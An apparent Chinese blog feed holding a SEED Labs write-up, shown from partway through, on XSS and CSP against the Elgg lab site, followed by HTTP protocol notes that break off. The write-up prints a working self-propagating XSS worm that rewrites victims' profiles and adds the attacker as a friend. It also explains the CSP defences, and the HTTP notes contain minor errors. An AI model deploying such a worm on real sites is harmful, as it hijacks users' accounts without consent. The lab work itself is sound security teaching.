HTML"（文本模式）。代码流程：使用DOMAPI获取自身副本，需要添加<code>&lt;script&gt;</code>标签开始和结束部分，因为通过<code>document.getElementById("worm")</code>获取得是页面中id 为 "worm" 的 <code>&lt;script&gt;</code>标签内的JavaScript代码；基于task5编写修改个人信息模块，只需将嵌入内容换成wormCode；复用task4中添加samy为好友模块。注：因为使用POST方法发送数据，且Content-Type设置为<code>application/x-wwwform-url</code>，所以需要使用<code>encodedencodeURICom()</code>函数对wormCode进行URL 编码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script id=<span class="hljs-string">&quot;worm&quot;</span> type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-comment">//DOM API</span><br>    <span class="hljs-keyword">var</span> headerTag = <span class="hljs-string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>; <br><span class="hljs-keyword">var</span> jsCode = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;worm&quot;</span>).<span class="hljs-property">innerHTML</span>; <br><span class="hljs-keyword">var</span> tailTag = <span class="hljs-string">&quot;&lt;/&quot;</span> + <span class="hljs-string">&quot;script&gt;&quot;</span>; <br><span class="hljs-keyword">var</span> wormCode = <span class="hljs-built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag); <br><span class="hljs-title function_">alert</span>(jsCode);<br><span class="hljs-comment">//modify profile</span><br>        <span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">name</span>;<br>        <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>;<br>        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>;<br>        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>;<br>        <br>        <span class="hljs-keyword">var</span> content=<span class="hljs-string">&quot;&amp;description=&quot;</span>+wormCode+<span class="hljs-string">&quot;&amp;accesslevel[description]=2&quot;</span>+token+ts+userName+guid;<br><br>        <span class="hljs-keyword">var</span> samyGuid=<span class="hljs-number">59</span>;<br>        <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;<br>        <br>        <span class="hljs-keyword">if</span>(elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>!=samyGuid)<br>        &#123;<br>            <span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br>            <span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>            <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>            <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>,<br>                                  <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>            <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>(content);<br>        &#125;<br>        <span class="hljs-comment">//add friend</span><br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;   <br>        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>;<br>        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>;<br>        <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/friends/add?friend=59&quot;</span> + ts + token;<br>        <span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>();<br>    &#125;<br>&lt;/script&gt;<br><br></code></pre></td></tr></table></figure></li><li><p>受害者1（Boby）访问Samy个人主页，出现弹窗，自动添加Samy为好友，自身个人信息被修改，xss攻击成功。注：此处使用弹窗显示源码是为演示方便，实际攻击中可将此行代码删除。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650576.png"alt="image-20231208163349213" /><figcaption aria-hidden="true">image-20231208163349213</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650577.png"alt="image-20231208163328854" /><figcaption aria-hidden="true">image-20231208163328854</figcaption></figure></li><li><p>受害者2（Alice）访问Boby个人主页，也出现弹窗，自动添加Samy为好友，自身个人信息被修改，xss攻击成功传播。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650578.png"alt="image-20231208163414483" /><figcaption aria-hidden="true">image-20231208163414483</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650579.png"alt="image-20231208163421710" /><figcaption aria-hidden="true">image-20231208163421710</figcaption></figure></li></ol><h2 id="elggs-countermeasures">3.8 Elgg’s Countermeasures</h2><p>本小节仅供参考，没有具体任务。它展示了 Elgg 如何抵御 XSS 攻击。Elgg确实有内置的应对措施，我们禁用了这些措施使攻击生效。实际上，Elgg使用了两种应对措施。一个是定制的安全插件HTMLawed，它可以验证用户输入并移除输入中的标记。我们在 input.php 中的filter_tags() 函数中注释了插件的调用，该函数位于 vendor/elgg/elgg/engine/lib/ 中。请参见以下内容：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650580.png"alt="image-20231208163547194" /><figcaption aria-hidden="true">image-20231208163547194</figcaption></figure><p>除了 HTMLawed 之外，Elgg 还使用 PHP 内置方法 htmlspecialchars()对用户输入的特殊字符进行编码，例如将"&lt;"编码为"&amp;lt"，将"&gt;"编码为"&amp;gt"等。该方法在 vendor/elgg/elgg/views/ default/output/ 文件夹内的dropdown.php、text.php 和 url.php中调用。我们已将它们注释掉，以关闭该对策。</p><h1 id="task-7-defeating-xss-attacks-using-csp">4. Task 7: Defeating XSSAttacks Using CSP</h1><p>XSS 漏洞的根本问题在于 HTML 允许 JavaScript代码与数据混合。因此，要解决这个根本问题，我们需要将代码与数据分开。在HTML 页面中加入 JavaScript代码有两种方法，一种是内联法，另一种是链接法。内联法是直接将代码放在页面中，而链接法是将代码放在外部文件中，然后从页面中链接到外部文件。</p><p>内联方式是 XSS漏洞的罪魁祸首，因为浏览器不知道代码最初来自哪里：是来自受信任的网络服务器，还是来自不受信任的用户？没有这些知识，浏览器就不知道哪些代码可以安全执行，哪些代码是危险的。链接方法为浏览器提供了一个非常重要的信息，即代码的来源。这样，网站就可以告诉浏览器哪些代码来源值得信赖，从而让浏览器知道哪段代码可以安全地执行。虽然攻击者也可以使用链接方法在输入中包含代码，但他们不能将代码放在那些值得信赖的地方。</p><p>网站如何告诉浏览器哪个代码源是可信的，是通过一种称为<strong>内容安全策略（CSP）</strong>的安全机制来实现的。这种机制专门用于抵御XSS 和 ClickJacking攻击。它已成为一种标准，目前大多数浏览器都支持它。CSP 不仅限制JavaScript代码，还限制其他页面内容，例如限制图片、音频和视频的来源，以及限制页面是否可以放在iframe 内（用于抵御 ClickJacking 攻击）。在此，我们将只关注如何使用 CSP来抵御 XSS 攻击。</p><h2 id="experiment-website-setup">4.1 Experiment Website setup</h2><p>为了进行 CSP 实验，我们将建立几个网站。在 Labsetup/image www docker镜像文件夹中，有一个名为 apache_csp.conf的文件。它定义了五个网站，这五个网站共享同一个文件夹，但它们将使用该文件夹中的不同文件。example60和 example70 网站用于托管 JavaScript 代码。example32a、example32b 和example32c 是三个具有不同 CSP 配置的网站。配置详情稍后解释。</p><p><strong>更改配置文件</strong>：在实验中，你需要修改 Apache配置文件（apache_csp.conf）。如果直接修改镜像文件夹中的文件，则需要重建镜像并重启容器，这样更改才能生效。</p><p>你也可以在容器运行时修改文件。这个选项的缺点是，为了保持 docker镜像的小巧，我们只在容器内安装了一个名为 nano的非常简单的文本编辑器。它应该足以满足简单编辑的需要。如果你不喜欢它，可以在Dockerfile中添加一条安装命令，安装你最喜欢的命令行文本编辑器。在运行的容器中，你可以在/etc/apache2/sites-available 文件夹中找到配置文件 apachecsp.conf。更改后，你需要重启 Apache 服务器才能使更改生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># service apache2 restart</span><br></code></pre></td></tr></table></figure><p><strong>DNS 设置</strong>：我们将从虚拟机访问上述网站。要通过各自的URL 访问这些网站，我们需要在 /etc/hosts文件中添加以下条目（如果在实验开始时尚未添加），以便将这些主机名映射到服务器容器的IP 地址（10.9.0.5）。 您需要使用 root 权限更改此文件（使用 sudo）。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650581.png"alt="image-20231208164042495" /><figcaption aria-hidden="true">image-20231208164042495</figcaption></figure><h2 id="the-web-page-for-the-experiment">4.2 The web page for theexperiment</h2><p>example32(a|b|c) 服务器托管同一个网页 index.html，用于演示 CSP策略如何工作。在该网页中，有六个区域，从 area1 到area6。最初，每个区域都显示 "Failed"（失败）。该页面还包括六段JavaScript 代码，每段代码都试图将 "OK"写入相应的区域。如果我们能在某个区域看到 OK，这意味着该区域对应的JavaScript 代码已成功执行；否则，我们将看到Failed。该页面上还有一个按钮。如果触发了底层的 JavaScript代码，点击按钮后会弹出一条信息。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650582.png"alt="image-20231208164125617" /><figcaption aria-hidden="true">image-20231208164125617</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650583.png"alt="image-20231208164133498" /><figcaption aria-hidden="true">image-20231208164133498</figcaption></figure><h2 id="setting-csp-policies">4.3 Setting CSP Policies</h2><p>CSP 由网络服务器设置为 HTTP标头。有两种典型的方法来设置头，一种是由网络服务器（如Apache）设置，另一种是由网络应用程序设置。在本实验中，我们将使用这两种方法进行实验。</p><p><strong>通过 Apache 配置 CSP</strong>：Apache 可以为所有响应设置 HTTP标头，因此我们可以使用 Apache 设置 CSP策略。在我们的配置中，我们设置了三个网站，但只有第二个网站设置了 CSP策略（■ 标记的行）。这样设置后，当我们访问 example32b 时，Apache将在该网站的所有响应中添加指定的 CSP 标头。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650584.png"alt="image-20231208164414434" /><figcaption aria-hidden="true">image-20231208164414434</figcaption></figure><p><strong>网络应用程序的 CSP 配置</strong>：对于配置文件中的第三个VirtualHost 条目（以 ● 标记），我们没有设置任何 CSP策略。不过，该网站的入口不是访问 index.html，而是访问phpindex.php，这是一个 PHP程序。下面列出的这个程序会在程序生成的响应中添加一个 CSP 标头。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650585.png"alt="image-20231208164449465" /><figcaption aria-hidden="true">image-20231208164449465</figcaption></figure><h2 id="lab-tasks-1">4.4 Lab tasks</h2><p>启动容器并更改 /etc/hosts 后，请从虚拟机访问以下 URL。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650586.png"alt="image-20231208164525588" /><figcaption aria-hidden="true">image-20231208164525588</figcaption></figure><ol type="1"><li>描述并解释您在访问这些网站时的观察结果。</li><li>点击所有三个网站网页中的按钮，描述并解释您的观察结果</li><li>更改 example32b 上的服务器配置（修改 Apache 配置），以便区域 5 和 6显示正常。请将修改后的配置写入实验报告</li><li>更改 example32c的服务器配置（修改 PHP 代码），使区域 1、2、4、5 和 6显示正常。请将修改后的配置写入实验报告。</li><li>请解释为什么 CSP 可以帮助防止跨站脚本攻击。</li></ol><p><strong>实验流程：</strong></p><ol type="1"><li><p>example32a.com：JS代码全部执行成功，因为未开启任何防护措施；example32b.com:4和6成功执行，因为Apache配置文件规定允许从同一域名加载脚本，同时也允许从<code>*.example70.com</code> 这个域名加载脚本；example32c.com:1,4和6成功执行,因为web应用程序（php代码）中设置允许从同一域名加载脚本，同时也允许从<code>*.example70.com</code> 这个域名加载脚本。此外，它还引入了一个nonce（number used once），允许该值为“111-111-111”的脚本执行。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952917.png"alt="image-20231031194634833" /><figcaption aria-hidden="true">image-20231031194634833</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952918.png"alt="image-20231031194642984" /><figcaption aria-hidden="true">image-20231031194642984</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952919.png"alt="image-20231031194701042" /><figcaption aria-hidden="true">image-20231031194701042</figcaption></figure></li><li><p>点击网站中的按钮。example32a.com:弹出JS代码执行成功的窗口，因为没有CSP保护；example32b.com和example32c.com:未执行，因为开启了CSP保护。</p></li><li><p>修改Apache配置文件。进入<code>/Labsetup/image_www/ apache_csp.conf</code>，在example32b.com中删除条目self,增加条目*.example60.com。重建镜像，启动容器。打开example32b.com，区域5和6显示OK.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952920.png"alt="image-20231031194908558" /><figcaption aria-hidden="true">image-20231031194908558</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650587.png"alt="image-20231208164842763" /><figcaption aria-hidden="true">image-20231208164842763</figcaption></figure></li><li><p>修改PHP代码。进入<code>/Labsetup/image_www/csp/phpindex.php</code>，增加条目*.example60.com和'nonce-222-222-222'。重建镜像，启动容器。打开example32c.com，区域1，2，4，5，6显示OK。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952921.png"alt="image-20231031195026156" /><figcaption aria-hidden="true">image-20231031195026156</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650588.png"alt="image-20231208164919501" /><figcaption aria-hidden="true">image-20231208164919501</figcaption></figure></li><li><p>CSP（Content Security Policy）:</p><ul><li><strong>限制脚本来源</strong>：CSP允许网页所有者指定哪些域名可以提供脚本代码，而哪些不可以。这意味着只有从经过信任验证的来源加载的脚本代码才会被执行，其他来源的脚本将被阻止。这减少了攻击者注入恶意脚本的机会，因为它们的来源不会被信任。</li><li><strong>禁止内联脚本</strong>：CSP允许网页所有者禁用内联脚本（嵌入在HTML代码中的脚本），这对于XSS攻击来说是一个常见的攻击向量。禁止内联脚本意味着攻击者无法在网页中注入恶意脚本代码。</li><li><strong>禁止动态代码执行</strong>：CSP可以阻止动态生成的脚本代码的执行，这可以防止XSS攻击中常见的恶意脚本注入。只有从受信任的来源加载的脚本才能执行。</li><li><strong>报告机制</strong>：CSP提供了一个报告机制，可以将违反策略的尝试报告给网页所有者，使其能够了解潜在的攻击尝试。这有助于及时识别和应对潜在的XSS攻击。</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>Web Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HTTP协议</title>
    <link href="/2023/10/31/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/HTTP%E5%8D%8F%E8%AE%AE/"/>
    <url>/2023/10/31/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/HTTP%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="基础">1. 基础</h1><h2 id="万维网的诞生与发展">1.1 万维网的诞生与发展</h2><p><strong>WWW三大构建技术：</strong></p><ul><li>HTML（超文本标记语言）</li><li>HTTP（超文本传输协议）</li><li>URL（统一资源定位符）</li></ul><h2 id="网络基础">1.2 网络基础</h2><h3 id="tcpip">1.2.1 TCP/IP</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541316.png"alt="image-20231120140138186" /><figcaption aria-hidden="true">image-20231120140138186</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541318.png"alt="image-20231120140205613" /><figcaption aria-hidden="true">image-20231120140205613</figcaption></figure><ul><li>链路层，有时也称作数据链路层或网络接口层，通常包括操作系统中的设备驱动程序和计算机中对应的网络接口卡。它们一起处理与电缆(或其他任何传输媒介）的物理接口细节。</li><li>网络层，处理分组在网络中的活动，例如分组的选路。在TCP/IP协议族中，网络层协议包括IP协议(网际协议），ICMP协议(Internet互联网控制报文协议），以及IGMP协议(Internet组管理协议）。</li><li>运输层，主要为两台主机上的应用程序提供端到端的通信。在TCP/IP协议族中，有两个互不相同的传输协议:TCP(传输控制协议）和UDP(用户数据报协议）。</li><li>应用层，负责处理特定的应用程序细节。</li></ul><p><strong>封装与拆分：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541319.png"alt="image-20231120140504545" /><figcaption aria-hidden="true">image-20231120140504545</figcaption></figure><h3 id="ip协议">1.2.2 IP协议</h3><p>IP协议：网际协议，是TCP/IP的核心协议，上层协议(TCP、UDP等）的数据包都是用IP包承载传输。</p><p><strong>特点：</strong></p><ul><li>不可靠</li><li>无连接</li></ul><p><strong>IP数据包格式：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541320.png"alt="image-20231120140702211" /><figcaption aria-hidden="true">image-20231120140702211</figcaption></figure><h3 id="tcp协议">1.2.3 TCP协议</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541321.png"alt="image-20231120140836668" /><figcaption aria-hidden="true">image-20231120140836668</figcaption></figure><p><strong>三次握手：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541322.png"alt="image-20231120140856101" /><figcaption aria-hidden="true">image-20231120140856101</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541323.png"alt="image-20231120152801937" /><figcaption aria-hidden="true">image-20231120152801937</figcaption></figure><p><strong>四次挥手：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541324.png"alt="image-20231120140925806" /><figcaption aria-hidden="true">image-20231120140925806</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541325.png"alt="image-20231120152834534" /><figcaption aria-hidden="true">image-20231120152834534</figcaption></figure><p><strong>滑动窗口：</strong></p><ul><li>可靠传输</li><li>超时重传</li><li>流量控制</li></ul><h3 id="dns协议">1.2.4 DNS协议</h3><p><strong>作用：</strong>将域名解析为IP地址</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541326.png"alt="image-20231120141123765" /><figcaption aria-hidden="true">image-20231120141123765</figcaption></figure><p><strong>分类：</strong></p><ul><li>递归查询</li><li>迭代查询</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541327.png"alt="image-20231120141230507" /><figcaption aria-hidden="true">image-20231120141230507</figcaption></figure><h2 id="url和uri">1.3 URL和URI</h2><h3 id="url统一资源定位符">1.3.1 URL（统一资源定位符）</h3><p><strong>作用：</strong>用于标识资源的方向、地点</p><p><strong>语法规则：</strong><code>scheme:/host.domain:port/path/filename</code></p><ul><li>scheme：定义因特网服务的类型。最常见的类型是 http。</li><li>host：定义域主机（http的默认主机是www）</li><li>domain：定义因特网域名</li><li>port：定义主机上的端口号（http默认端口号是80）</li><li>path：定义服务器上的路径（如果省略，则文档必须位于网站的根目录中）</li><li>filename：定义文档、资源名称</li></ul><h3 id="uri-统一资源标识符">1.3.2 URI （统一资源标识符）</h3><p><strong>作用：</strong>用字符串标识某一互联网资源</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541328.png"alt="image-20231120141913511" /><figcaption aria-hidden="true">image-20231120141913511</figcaption></figure><h3 id="区别">1.3.3 区别</h3><ul><li>URL给出资源位于哪里（哪台主机、哪个路径、哪个文件夹）</li><li>URI给出具体某资源的定位路径（从资源自身出发，给出可达的路径）</li></ul><h1 id="特点">2. 特点</h1><h2 id="请求与响应">2.1 请求与响应</h2><p><strong>通信双方：</strong></p><ul><li>服务器：发起请求</li><li>客户端：响应请求</li></ul><p><strong>规定：</strong></p><ul><li>客户端发起请求，服务端才会响应</li><li>客户端未发起请求，服务器是不会响应的</li></ul><h2 id="无状态协议">2.2 无状态协议</h2><ul><li>HTTP协议不保存请求和响应的通信状态，不做持久化处理</li><li>每次新的请求，对应一次响应产生</li></ul><h2 id="资源定位">2.3 资源定位</h2><p>HTTP协议通过请求URI，实现对资源的访问</p><p>示例：<code>http//finance.sina.caom.cn/zl/china/2021-02-01/zl-ikftssap2140491.shtml</code></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541329.png"alt="image-20231120142337366" /><figcaption aria-hidden="true">image-20231120142337366</figcaption></figure><h2 id="请求方法">2.4 请求方法</h2><p>方法是为了告知服务器，该请求的意图是什么，向服务器所请求的资源下达命令。</p><ul><li>GET：获取资源</li><li>POST：传输实体主体</li><li>PUT：传输文件</li><li>OPTIONS：询问支持的方法</li><li>HEAD：获得报文首部</li><li>DELETE：删除文件</li><li>TRACE：追踪路径</li><li>CONNECT：要求用隧道协议连接代理</li></ul><h2 id="持久连接pipeline">2.5 持久连接&amp;pipeline</h2><p><strong>为什么引入持久连接：</strong></p><ul><li>最早期版本，发起一次HTTP请求，就需要建立一次tcp连接。</li><li>服务器成本较高（一对多，多个tcp连接，多台客户端请求)</li></ul><p><strong>持久连接：</strong></p><ul><li>建立一次tcp连接，只要任意一端没有提出断开连接，tcp连接就保持着。</li><li>减少了服务器压力，相同时间更快传输完内容，显示速度也相应提升。</li></ul><p><strong>pipeline：</strong></p><ul><li>客户端可以一次发送多个请求，同时接收多个响应。</li><li>并发传输，进一步提升了资源传输的效率，内容显示更。</li></ul><h2 id="cookie技术">2.6 cookie技术</h2><ul><li>cookie会根据从服务器端发送的响应报文内的—个叫做Set-Cookie的首部字信息，通知客户端保存Cookie。客户端下次再向服务器发送请求时，会自动携带cookie信息，一起发送给服务器。</li><li>服务器发现客户端发送过来的cookie后。会去检查是从哪一个客户端发来的连接请求，然后对比服务器上的记录。最后得到之前的状态信息。这时，就可为客户盛连续提供状态性的服务了。</li></ul><h1 id="请求方式">3. 请求方式</h1><h2 id="http方法">3.1 HTTP方法</h2><ul><li>HTTP客户端发出请求，告知服务端需要执行不同类型的请求命令，这些命令被称为HTTP方法。</li><li>简版:HTTP方法是告诉服务器要做什么。</li></ul><h2 id="get">3.2 GET</h2><p><strong>作用：</strong>通常用于请求服务器发送某个资源，也是最常用一种的方法。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541330.png"alt="image-20231120143414771" /><figcaption aria-hidden="true">image-20231120143414771</figcaption></figure><h2 id="post">3.3 POST</h2><p><strong>作用：</strong></p><ul><li>POST方法是用来向服务器输入数据的，主要支持HTML表单。</li><li>表单填写好后会被发送给服务器，比如登录窗口输入用户名和密码，供服务器验证备份。</li></ul><p><strong>注意：</strong></p><p>与PUT方法的区别，POST用于向服务器发送数据，PUT用于向服务器上的资源（比如文件）中存储数据。</p><h2 id="put">3.4 PUT</h2><p><strong>作用:</strong></p><ul><li>PUT方法是向服务器写入文档。让服务器请求的主部分来创建一个由所请求的URL命名的新文档，若已存在该文件，就用这个主体代它。</li><li>因为涉及内容修改，大部分执行PUT方法前，被要求登录。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541331.png"alt="image-20231120143934749" /><figcaption aria-hidden="true">image-20231120143934749</figcaption></figure><h2 id="head">3.5 HEAD</h2><p><strong>作用:</strong></p><p>类似于GET方法，但只需要服务器返回首部，不返回实的主体部分。可实现未获取实际资源的情况下，对资源的首部进行检查。</p><ul><li>可用于判断资源类型</li><li>过状态码判断资源是否存在</li><li>测试资源是否被修改</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541332.png"alt="image-20231120143945367" /><figcaption aria-hidden="true">image-20231120143945367</figcaption></figure><h2 id="delete">3.6 DELETE</h2><p><strong>作用:</strong></p><ul><li>请求服务器时删除请求中的URL所指定的资源。但不一定成功。</li><li>不成功的原因,HTTP规范允许服务器在不通知客户端的情况下撤销请示。</li></ul><h2 id="options">3.7 OPTIONS</h2><p><strong>作用:</strong></p><ul><li>询问服务器支持的各种功能</li><li>可以询问服务器支持些方法</li><li>可以询问某些特殊资源支持些方法</li></ul><h2 id="trace">3.8 TRACE</h2><p><strong>作用:</strong></p><ul><li>跟踪请求经过了哪些中间环节（防火墙、代理等)</li><li>每个中间节点可以修改原始的http请示，即增加代表自己的信息</li><li>最后的响应服务器将最终的请示头,作为响应主体，返回给客户端。</li></ul><h1 id="状态码">4. 状态码</h1><h2 id="概念">4.1 概念</h2><ul><li>客户端向服务器发出请求，状态码用于描述返回的请求结果</li><li>状态码由3位数字和原因短语组成，首位数字表示响应类别，原因短语代表说明和含义，比如200ok，404 Not Found。</li><li>不同的状恋码，代表不同的状态。借助状态码，用户可以知道服务器是正常处理了请求，还是出现了错误，出现了哪类可能的错误。</li></ul><h2 id="xx状态码">4.2 2XX状态码</h2><ul><li>2XX的响应结果表明请求被正常处理了</li><li>常见的有200、204、206</li></ul><p><strong>200 OK:</strong></p><ul><li>表示从客户端发来的请求在服务器端被正常处理了。</li><li>浏览器会接着处理、显示返回的数据。</li></ul><p><strong>204 Not Content:</strong></p><ul><li>表明请示已经执行成功，但不需要做任何响应。204响应码会中断浏览器的页面跳转，浏览器会保持原URL不变，页面内容也维持原状。</li><li>响应报文中没有实体的主体部分，主要用于在浏览器不转为显示新文档的情况下，对其进行更新(比如新一个表单页面)</li></ul><p><strong>206 Partial Content:</strong></p><ul><li>表明客户端进行了范围请求，而服务器成功执行了这部分的Get请求。</li><li>响应报文中包含由Content-Range指定范围的实体内容。然后由浏览器进行内容整合。</li></ul><h2 id="xx状态码-1">4.3 3XX状态码</h2><ul><li>3XX代表重定向状态码，表明浏览器需要执行某些特殊的处理以正确处理请求。</li><li>常见的有301、302、303、304、307</li></ul><p><strong>301 Moved Permanently：</strong></p><ul><li>永久性重定向，该状态码表示请求的资源已被分配了新的URI，以后应使用资源现在所指的URI。</li><li>新地址会在响应头的Location字段中指定。</li></ul><p><strong>302 Found：</strong> -临时性重定向，表示请求的资源已被分配了新的URI。希望用户本次能使用新的URI访问-与301相似，但302表示的不是永久移动，只是临时性质的，已移动资源对应的URI将来还有可能发生改变。</p><p><strong>303 See Other：</strong></p><ul><li>表示由于请求对应的资源存在着另一个URI，应使用Get方法定向获取请求的资源。</li><li>303状态码和302有着相同的功能，但303状态码明确表示客户端应当采用GET方法获取资源，这点与302状态码有区别。</li></ul><p><strong>注：</strong>301、302、303的啊应，浏览器都会把POST方法为GET方法，去除请求里的POST数据体部分，并自动重新再发送一次请求。</p><p><strong>304 Not Modified：</strong></p><ul><li>该状态码表示客户端发送附带条件的请求时，服务器端允许请示访问资源，但这次请求的文档和之前请求过的版本相比并没有变化。304状态码返回时，不包含任何响应的主体部分。</li><li>这个响应会根据If-Modified-Since头域的设定。对最后修改时间进行条件判断，然后确定是否需要更新浏览端的文件缓存副本。</li><li>虽然304划分在3XX类别中。但是和重定向没有关系。</li></ul><p><strong>307 Temporary Redirect：</strong></p><ul><li>临时重定向。该状态码与302 